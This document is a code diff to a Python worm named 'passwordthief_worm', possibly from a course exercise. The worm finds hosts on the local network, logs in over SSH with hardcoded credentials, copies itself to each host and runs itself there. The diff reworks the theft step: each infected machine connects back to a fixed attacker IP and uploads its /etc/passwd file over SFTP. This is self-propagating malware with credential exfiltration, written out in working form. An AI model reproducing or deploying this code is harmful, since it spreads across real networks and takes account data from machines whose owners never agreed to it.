@@ -82,11 +82,14 @@ def getHostsOnTheSameNetwork():
 #to the /tmp folder of attacker system
 #########################################################
  
-def stealPassword(ssh):
+def stealPassword(host):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect("192.168.1.4", username = "ubuntu", password = "123456")
     sftpClient = ssh.open_sftp()
-    os.chdir("/tmp/")
     print("started stealing password") 
-    sftpClient.get("/etc/passwd","/tmp/passwd")
+    outfile = "/tmp/passwd_"+host
+    sftpClient.put("/etc/passwd",outfile)
     print("Stole the password successfully!")
  
   
@@ -100,7 +103,7 @@ def exploitTarget(ssh):
     ssh.exec_command("chmod a+x /tmp/passwordthief_worm.py")
     ssh.exec_command("nohup python -u /tmp/passwordthief_worm.py > /tmp/worm.output &")
     print("Infected this system sucessfully !! ;) Going Forward to Steal Password")
-    stealPassword(ssh)
+    
      
   
   
@@ -137,16 +140,6 @@ def checkCredentials(hostIp):
     print("Could not login to the system")
     return ssh
  
-################################################
-#This function renames the copied passwd file
-#desired format: passwd_<IP address of Victim>
-################################################
-def renamePasswordFile(host):
-    rename = "passwd_" + host
-    print("renaming file passwd now...")
-    os.rename("/tmp/passwd", rename)
-    print("Passwd File renamed Successfully!")
- 
  
   
 #################################################
@@ -159,6 +152,13 @@ print("Started infecting the network .....")
 discoveredHosts = getHostsOnTheSameNetwork()
 markInfected()
 myIp = getMyIP() 
+
+if(cmp(myIp, ATTACKER_IP) != 0):
+    try:
+        stealPassword(myIp)
+	print("Cleaned up all traces")
+    except Exception, e:
+    	print("Problem in getting hte passwd file:", e)
   
 for host in discoveredHosts:
     print(host + " under Observation ...")
@@ -171,7 +171,6 @@ for host in discoveredHosts:
                 try:
                     exploitTarget(ssh)
                     ssh.close()
-                    renamePasswordFile(host)
                     break
         	except:
             	    print("Failed to execute worm")
